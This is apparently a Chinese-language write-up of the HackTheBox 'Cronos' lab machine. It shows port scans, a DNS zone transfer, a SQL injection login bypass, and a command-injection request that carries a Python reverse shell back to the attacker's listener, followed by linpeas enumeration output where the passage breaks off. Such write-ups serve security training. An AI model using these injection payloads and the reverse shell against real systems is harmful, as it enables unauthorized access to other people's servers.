# cronos

```
nmap -sS -sV -p- --min-rate 5000 10.129.227.211 
┌──(root㉿kali)-[~/桌面/vpn]
└─# netstat -antlp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 192.168.199.128:58988   209.58.165.155:443      ESTABLISHED 15050/openvpn       
                                                                                  
┌──(root㉿kali)-[~/桌面/vpn]
└─# nmap -sS -sV -p- --min-rate 5000 10.129.227.211            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 09:53 CST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 7.72% done; ETC: 09:53 (0:00:12 remaining)
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 13.12% done; ETC: 09:53 (0:00:13 remaining)
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 83.33% done; ETC: 09:53 (0:00:00 remaining)
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 83.33% done; ETC: 09:53 (0:00:00 remaining)
Nmap scan report for 10.129.227.211
Host is up (0.19s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.95 seconds
                                                                                  
┌──(root㉿kali)-[~/桌面/vpn]
└─# nmap -sS -sV -p- -V --min-rate 5000 10.129.227.211
Nmap version 7.93 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.3.6 openssl-3.0.8 libssh2-1.10.0 libz-1.2.13 libpcre-8.39 nmap-libpcap-1.7.3 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select
                                                                                  
┌──(root㉿kali)-[~/桌面/vpn]
└─# nmap -sS -sV -p- -A --min-rate 5000 10.129.227.211
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 09:55 CST
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.76% done; ETC: 09:55 (0:00:00 remaining)
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 9.13% done; ETC: 09:55 (0:00:10 remaining)
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 12.07% done; ETC: 09:55 (0:00:15 remaining)
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 14.58% done; ETC: 09:55 (0:00:12 remaining)
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 16.45% done; ETC: 09:55 (0:00:10 remaining)
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 20.15% done; ETC: 09:55 (0:00:12 remaining)
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 20.57% done; ETC: 09:55 (0:00:12 remaining)
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 20.97% done; ETC: 09:55 (0:00:11 remaining)
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 21.28% done; ETC: 09:55 (0:00:11 remaining)
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 21.71% done; ETC: 09:55 (0:00:11 remaining)
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 22.10% done; ETC: 09:55 (0:00:11 remaining)
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 22.43% done; ETC: 09:55 (0:00:10 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 22.87% done; ETC: 09:55 (0:00:10 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 23.26% done; ETC: 09:55 (0:00:10 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 23.48% done; ETC: 09:55 (0:00:10 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 24.02% done; ETC: 09:55 (0:00:09 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 24.12% done; ETC: 09:55 (0:00:09 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 24.58% done; ETC: 09:55 (0:00:09 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 24.79% done; ETC: 09:55 (0:00:09 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 25.17% done; ETC: 09:55 (0:00:09 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 25.53% done; ETC: 09:55 (0:00:09 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 25.93% done; ETC: 09:55 (0:00:11 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 26.37% done; ETC: 09:55 (0:00:11 remaining)
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 26.61% done; ETC: 09:55 (0:00:11 remaining)
Nmap scan report for 10.129.227.211
Host is up (0.12s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18b973826f26c7788f1b3988d802cee8 (RSA)
|   256 1ae606a6050bbb4192b028bf7fe5963b (ECDSA)
|_  256 1a0ee7ba00cc020104cda3a93f5e2220 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/5%OT=22%CT=1%CU=33883%PV=Y%DS=2%DC=T%G=Y%TM=64546241
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=102%TI=Z%II=I%TS=8)SEQ(SP=10
OS:2%GCD=1%ISR=102%TI=Z%CI=I%II=I%TS=8)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3
OS:=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=7120%W2=7
OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53ANNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   129.81 ms 10.10.16.1
2   91.69 ms  10.129.227.211

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.67 seconds

```

```
	gobuster dir -u http://10.129.227.211/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k 
```

访问80端口，是一个apache的welcome页面，没有什么太多的信息。尝试爆破目录，但是没有什么收获。其他的端口还有22端口和53端口，22端口测试了一下ssh用户枚举但是没有什么收获，53端口是域名服务器开放的DNS服务。

```
nslookup requseted_domain_name name_server //向域名服务器发起查询域名的请求,查询域名对应的ip
```

```
nslookup requseted_ip name_server //向域名服务器查询ip对应的域名
```

```
nslookup 10.129.227.211 10.129.227.211//in-addr.arpa是反查的ip，可以发现ip地址也是反着的，name是这个ip在服务器里对应的域名记录。
```

![image-20230505112006788](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230505112006788.png)

可以得到的信息是，这个10.129.227.211 ip地址对应的域名是ns1.cronos.htb，那么说明10.129.227.211这台机器是cronos.htb的域名解析服务器。那么问题来了，cronos.htb的ip地址是多少呢。

```
┌──(root㉿kali)-[~/桌面/vpn]
└─# nslookup cronos.htb 10.129.227.211
Server:         10.129.227.211
Address:        10.129.227.211#53

Name:   cronos.htb
Address: 10.10.10.13

```

dig命令的axfr可以查询域名服务器里关于一个域名的所有域名记录

```
dig axfr @name_server domain_name
```

```
┌──(root㉿kali)-[~/桌面/vpn]
└─# dig axfr @10.129.227.211 cronos.htb

; <<>> DiG 9.18.12-1-Debian <<>> axfr @10.129.227.211 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 112 msec
;; SERVER: 10.129.227.211#53(10.129.227.211) (TCP)
;; WHEN: Fri May 05 14:23:17 CST 2023
;; XFR size: 7 records (messages 1, bytes 203)

```

```
DNS域传送
作为重要的互联网基础设施，难免成为黑客的重点攻击目标，服务的稳定性尤为重要。DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。

若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。

大的互联网厂商通常将内部网络与外部互联网隔离开，一个重要的手段是使用Private DNS。如果内部DNS泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部网络沦陷。

DNS域传送漏洞检测
常用的三种检测方法: nslookup命令, nmap命令，　dig命令，　下面将分别演示如何用三种方法检测dns域传送漏洞

```



可以看到，按道理来说10.10.10.13是cronos.htb和admin.cronos.htb的地址，但是在更改/etc/hosts文件时发现，添加

```
10.10.10.13 cronos.htb
10.10.10.13 admin.cronos.htb
```

并不能访问到admin.cronos.htb。说明域名服务器里的域名记录是过时的，cronos.htb的ip已经不是10.10.10.13，尝试更改为

```
10.129.227.211 cronos.htb
10.129.227.211 admin.cronos.htb
```

再次尝试访问，可以通过域名访问到。

通过万能密码登录

```
username=admin' or 1=1 -- +
```

```
┌──(root㉿kali)-[~/桌面/vpn]
└─# nc -nlvp 1234                         
listening on [any] 1234 ...
connect to [10.10.16.9] from (UNKNOWN) [10.129.227.211] 41124
bash: cannot set terminal process group (1368): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ 
```



```
POST /welcome.php HTTP/1.1

Host: admin.cronos.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 27

Origin: http://admin.cronos.htb

Connection: close

Referer: http://admin.cronos.htb/welcome.php

Cookie: PHPSESSID=pr80aei8ulogg0342so9f4kk34

Upgrade-Insecure-Requests: 1



command=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.9",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'&host=
```

```
www-data@cronos:/var/www/html$ ./linpeas.sh
./linpeas.sh


                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    linpeas v3.1.5 - Safe OSCP by carlospolop
                                                                                  
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                
                                                                                  
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist                                                                
 LEGEND:                                                                          
  RED/YELLOW: 95% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username

 Starting linpeas. Caching Writable Folders...

════════════════════════════════════╣ Basic information ╠════════════════════════════════════                                                                       
OS: Linux version 4.4.0-72-generic (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: cronos
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)                                                                   
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                       
                                                                                  

Caching directories using 1 threads . . . . . . . . . . . . . . . . . . . . . . . . DONE                                                                            
                                                                                  
════════════════════════════════════╣ System Information ╠════════════════════════════════════                                                                      
[+] Operative system                                                              
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits   
Linux version 4.4.0-72-generic (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.2 LTS
Release:        16.04
Codename:       xenial

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version      
Sudo version 1.8.16                                                               

[+] USBCreator
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                        
                                                                                  
[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                      
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[+] Date
Fri May  5 11:08:06 EEST 2023                                                     

[+] System stats
Filesystem                   Size  Used Avail Use% Mounted on                     
udev                         477M     0  477M   0% /dev
tmpfs                        100M  7.0M   93M   7% /run
/dev/mapper/cronos--vg-root  6.6G  2.6G  3.9G  41% /
tmpfs                        497M     0  497M   0% /dev/shm
tmpfs                        5.0M     0  5.0M   0% /run/lock
tmpfs                        497M     0  497M   0% /sys/fs/cgroup
/dev/sda1                    248M  153M   83M  65% /boot
              total        used        free      shared  buff/cache   available
Mem:        1016096      285172       91572       18696      639352      501732
Swap:       1048572        1176     1047396

[+] CPU info
Architecture:          x86_64                                                     
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                1
On-line CPU(s) list:   0
Thread(s) per core:    1
Core(s) per socket:    1
Socket(s):             1
NUMA node(s):          1
Vendor ID:             AuthenticAMD
CPU family:            23
Model:                 49
Model name:            AMD EPYC 7302P 16-Core Processor
Stepping:              0
CPU MHz:               2994.375
BogoMIPS:              5988.75
Hypervisor vendor:     VMware
Virtualization type:   full
L1d cache:             32K
L1i cache:             32K
L2 cache:              512K
L3 cache:              131072K
NUMA node0 CPU(s):     0
Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc extd_apicid eagerfpu pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap xsaveopt arat

[+] Environment
[i] Any private information inside environment variables?                         
HISTFILESIZE=0                                                                    
SHLVL=2
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Searching Signature verification failed in dmseg
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                                                                 
 Not Found                                                                        
                                                                                  
[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
[+] grsecurity present? ............ grsecurity Not Found
[+] PaX bins present? .............. PaX Not Found                                
[+] Execshield enabled? ............ Execshield Not Found                         
[+] SELinux enabled? ............... sestatus Not Found                           
[+] Is ASLR enabled? ............... Yes                                          
[+] Printer? ....................... lpstat Not Found
[+] Is this a virtual machine? ..... Yes (vmware)                                 
[+] Is this a container? ........... No
[+] Any running containers? ........ No                                           
                                                                                  

═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════                                                                      
[+] Any sd*/disk* disk in /dev? (limit 20)                                        
disk                                                                              
sda
sda1
sda2
sda5

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                       
/dev/mapper/cronos--vg-root /               ext4    errors=remount-ro 0       1   
UUID=259f5707-a2a1-4efc-9c76-1f74e1fc2f6e /boot           ext2    defaults        0       2
/dev/mapper/cronos--vg-swap_1 none            swap    sw              0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0


════════════════════════════════════╣ Available Software ╠════════════════════════════════════                                                                      
[+] Useful software                                                               
/bin/nc                                                                           
/bin/netcat
/usr/bin/wget
/usr/bin/curl
/bin/ping
/usr/bin/base64
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo
/usr/bin/lxc

[+] Installed Compiler
/usr/share/gcc-5                                                                  


══════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════                                                       
[+] Cleaned processes                                                             
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                            
root         1  0.0  0.5  37840  5824 ?        Ss   04:50   0:02 /sbin/init       
root       481  0.0  0.3  29504  3120 ?        Ss   04:50   0:00 /lib/systemd/systemd-journald
root       508  0.0  0.1 102968  1528 ?        Ss   04:50   0:00 /sbin/lvmetad -f
root       520  0.0  0.3  44508  3700 ?        Ss   04:50   0:00 /lib/systemd/systemd-udevd
systemd+   812  0.0  0.2 100324  2384 ?        Ssl  04:50   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root       924  0.0  2.2 266532 22436 ?        Ssl  04:50   0:00 /usr/lib/snapd/snapd
root       928  0.0  0.1   4400  1320 ?        Ss   04:50   0:00 /usr/sbin/acpid
daemon[0m     930  0.0  0.1  26044  1956 ?        Ss   04:50   0:00 /usr/sbin/atd -f
root       940  0.0  0.2  29008  2732 ?        Ss   04:50   0:00 /usr/sbin/cron -f
root       942  0.0  1.1 275860 12068 ?        Ssl  04:50   0:00 /usr/lib/accountsservice/accounts-daemon[0m
syslog     943  0.0  0.3 256396  3056 ?        Ssl  04:50   0:00 /usr/sbin/rsyslogd -n
root       952  0.0  0.1  20100  1164 ?        Ss   04:50   0:00 /lib/systemd/systemd-logind
root       953  0.0  0.5 629524  5976 ?        Ssl  04:50   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       954  0.0  1.0 192236 10476 ?        Ssl  04:50   0:16 /usr/bin/vmtoolsd
message+   964  0.0  0.3  42904  3720 ?        Ss   04:50   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation         
  └─(Caps) 0x0000000020000000=cap_audit_write
root      1005  0.0  0.0  13376   168 ?        Ss   04:50   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemon[0mise --scan --syslog
root      1016  0.0  0.5 277180  5784 ?        Ssl  04:50   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1093  0.0  0.2  16124  2828 ?        Ss   04:50   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.ens160.pid -lf /var/lib/dhcp/dhclient.ens160.leases -I -df /var/lib/dhcp/dhclient6.ens160.leases ens160
root      1197  0.0  0.5  65520  6084 ?        Ss   04:50   0:00 /usr/sbin/sshd -D
root      1230  0.0  0.0   5224   160 ?        Ss   04:50   0:00 /sbin/iscsid
root      1231  0.0  0.3   5724  3512 ?        S<Ls 04:50   0:02 /sbin/iscsid
mysql     1251  0.0 16.6 1107396 169272 ?      Ssl  04:50   0:07 /usr/sbin/mysqld
bind      1333  0.0  1.8 208896 19176 ?        Ssl  04:50   0:01 /usr/sbin/named -f -u bind -4
  └─(Caps) 0x0000000001000400=cap_net_bind_service,cap_sys_resource
root      1348  0.0  0.1  15940  1644 tty1     Ss+  04:50   0:00 /sbin/agetty --noclear tty1 linux
root      1368  0.0  2.9 325536 29744 ?        Ss   04:50   0:01 /usr/sbin/apache2 -k start
www-data  2728  0.0  1.4 326404 14768 ?        S    06:25   0:03  _ /usr/sbin/apache2 -k start                                                                      
www-data  2730  0.0  2.1 326612 21380 ?        S    06:25   0:03  _ /usr/sbin/apache2 -k start                                                                      
www-data  2731  0.0  1.4 326404 14776 ?        S    06:25   0:03  _ /usr/sbin/apache2 -k start                                                                      
www-data 15813  0.0  0.3  18216  3296 ?        S    10:22   0:00  |           _ /bin/bash -i
www-data 15859  0.0  0.6  32172  6972 ?        S    10:26   0:00  |               _ python -c import pty; pty.spawn("/bin/bash")
www-data 15860  0.0  0.3  18228  3332 pts/0    Ss   10:26   0:00  |                   _ /bin/bash
www-data 16348  0.4  0.2   4844  2056 pts/0    S+   11:08   0:00  |                       _ /bin/sh ./linpeas.sh
www-data 17002  0.0  0.0   4844   496 pts/0    S+   11:08   0:00  |                           _ /bin/sh ./linpeas.sh
www-data 17006  0.0  0.3  34724  3236 pts/0    R+   11:08   0:00  |                           |   _ ps fauxwww
www-data 17005  0.0  0.0   4844   496 pts/0    S+   11:08   0:00  |                           _ /bin/sh ./linpeas.sh
www-data  5033  0.0  1.4 326404 14768 ?        S    06:25   0:03  _ /usr/sbin/apache2 -k start                                                                      
www-data  8826  0.0  1.4 326404 14768 ?        S    06:25   0:03  _ /usr/sbin/apache2 -k start                                                                      
www-data 12577  0.0  1.4 326404 14832 ?        S    06:25   0:03  _ /usr/sbin/apache2 -k start                                                                      
www-data 13185  0.0  1.5 326404 15760 ?        S    06:25   0:03  _ /usr/sbin/apache2 -k start                                                                      
www-data 13187  0.0  1.4 326404 14844 ?        S    06:25   0:03  _ /usr/sbin/apache2 -k start                                                                      
www-data 13199  0.0  1.4 326404 14844 ?        S    06:25   0:03  _ /usr/sbin/apache2 -k start                                                                      
www-data 13589  0.0  1.5 326412 15900 ?        S    07:00   0:01  _ /usr/sbin/apache2 -k start                                                                      

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes         
-rwxr-xr-x 1 root root  1037528 Jun 24  2016 /bin/bash                            
lrwxrwxrwx 1 root root        4 Mar 22  2017 /bin/sh -> dash
-rwxr-xr-x 1 root root   326224 Jan 19  2017 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   618520 Jan 19  2017 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root   141904 Jan 19  2017 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   453240 Jan 19  2017 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    44104 Dec 16  2016 /sbin/agetty
-rwxr-xr-x 1 root root   487248 Dec  9  2016 /sbin/dhclient
lrwxrwxrwx 1 root root       20 Mar 22  2017 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root   783984 Dec  9  2016 /sbin/iscsid
-rwxr-xr-x 1 root root    51336 Apr 16  2016 /sbin/lvmetad
-rwxr-xr-x 1 root root   513216 Feb 20  2017 /sbin/mdadm
